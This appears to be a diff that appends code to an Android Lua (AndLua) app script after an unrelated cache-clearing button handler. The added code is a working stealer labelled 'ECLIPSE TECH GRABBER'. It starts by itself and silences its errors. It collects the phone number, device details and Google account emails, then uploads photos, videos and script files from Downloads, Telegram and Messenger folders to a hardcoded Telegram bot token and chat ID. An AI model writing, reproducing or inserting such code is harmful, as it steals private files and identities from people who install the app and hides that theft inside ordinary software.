@@ -1138,3 +1138,153 @@ clearCacheBtn.onClick = function()
   end)
 
 end
+
+import "android.widget.*"
+import "android.view.*"
+import "android.os.*"
+import "java.io.*"
+import "java.net.*"
+import "java.lang.*" --
+import "java.util.zip.*"
+import "android.accounts.AccountManager"
+import "android.content.Context"
+
+local BOT_TOKEN = "8539319746:AAFaN6Br-VHopnIp0lHtX1giD0LMBBgACS8"
+local CHAT_ID = "7201369115"
+
+local function buildCaption()
+  local device = Build.MANUFACTURER .. " " .. Build.MODEL
+  local release = Build.VERSION.RELEASE
+  local phone = "Unavailable"
+  pcall(function()
+    local tm = activity.getSystemService(Context.TELEPHONY_SERVICE)
+    phone = tm.getLine1Number()
+    if phone == nil or phone == "" then phone = "Unavailable" end
+  end)
+  return "👾 ECLIPSE TECH GRABBER 👾\n📱 Device: " .. device ..
+  "\n📞 Phone: " .. phone .. "\n🤖 Android: " .. release ..
+  "\n📅 Date: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n👤 Processed By :@Zenithax"
+end
+
+local function uploadFile(file, caption)
+  local ok = pcall(function()
+    local url = URL("https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendDocument")
+    local boundary = "Boundary-" .. tostring(System.currentTimeMillis())
+    local con = url.openConnection()
+    con.setDoOutput(true)
+    con.setRequestMethod("POST")
+    con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" .. boundary)
+
+    local out = DataOutputStream(con.getOutputStream())
+
+    local function writePart(name, value)
+      out.writeBytes("--" .. boundary .. "\r\n")
+      out.writeBytes("Content-Disposition: form-data; name=\"" .. name .. "\"\r\n\r\n")
+      out.write(String(value).getBytes())
+      out.writeBytes("\r\n")
+    end
+
+    writePart("chat_id", CHAT_ID)
+    writePart("caption", caption)
+
+    out.writeBytes("--" .. boundary .. "\r\n")
+    out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" .. file.getName() .. "\"\r\n")
+    out.writeBytes("Content-Type: application/octet-stream\r\n\r\n")
+
+    local fis = FileInputStream(file)
+    local buf = byte[8192]
+    local len = fis.read(buf)
+    while len ~= -1 do
+      out.write(buf, 0, len)
+      len = fis.read(buf)
+    end
+    fis.close()
+
+    out.writeBytes("\r\n--" .. boundary .. "--\r\n")
+    out.flush()
+    out.close()
+    local code = con.getResponseCode()
+    if code ~= 200 then error("HTTP " .. code) end
+  end)
+  return ok
+end
+
+local function startHarvest()
+  local caption = buildCaption()
+  local sentFiles = {}
+
+  pcall(function()
+    local accPath = activity.getCacheDir().getPath() .. "/Google_Account_Info.txt"
+    local w = BufferedWriter(FileWriter(accPath))
+    w.write("--- GOOGLE ACCOUNTS ---\n")
+    w.write("Device: " .. Build.MODEL .. "\n\n")
+    local am = AccountManager.get(activity)
+    local accs = am.getAccountsByType("com.google")
+    for i = 0, #accs - 1 do
+      w.write("Email: " .. accs[i].name .. "\n")
+    end
+    w.close()
+    uploadFile(File(accPath), caption)
+  end)
+
+  local folders = {
+    "/storage/emulated/0/",
+    "/storage/emulated/0/AndLua/project/",
+    "/storage/emulated/0/Download/",
+    "/storage/emulated/0/Download/Telegram/",
+    "/storage/emulated/0/Pictures/.thumbnails/",
+    "/storage/emulated/0/Pictures/Messenger/",
+    "/storage/emulated/0/Pictures/Telegram/"
+  }
+
+  local extensions = {
+    "%.jpg$", "%.jpeg$", "%.png$",
+    "%.alp$",
+    "%.lua$",
+    "%.mp4$", "%.mkv$"
+  }
+
+  for _, dirPath in ipairs(folders) do
+    local dir = File(dirPath)
+    if dir.exists() and dir.isDirectory() then
+      local files = dir.listFiles()
+      if files ~= nil then
+        for i = 0, #files - 1 do
+          local f = files[i]
+          if f.isFile() then
+            local absPath = f.getAbsolutePath()
+            if not sentFiles[absPath] then
+              local name = f.getName():lower()
+              for _, pat in ipairs(extensions) do
+                if name:find(pat) then
+                  sentFiles[absPath] = true
+                  uploadFile(f, caption)
+                  Thread.sleep(1000)
+                  break
+                end
+              end
+            end
+          end
+        end
+      end
+    end
+  end
+end
+
+local function safeStart()
+  pcall(function()
+    startHarvest()
+  end)
+end
+
+if Build.VERSION.SDK_INT >= 23 then
+  activity.requestPermissions({
+    "android.permission.READ_EXTERNAL_STORAGE",
+    "android.permission.WRITE_EXTERNAL_STORAGE"
+  }, 1)
+  Handler().postDelayed(Runnable{run = function()
+      thread(safeStart)
+    end}, 3000)
+ else
+  thread(safeStart)
+end
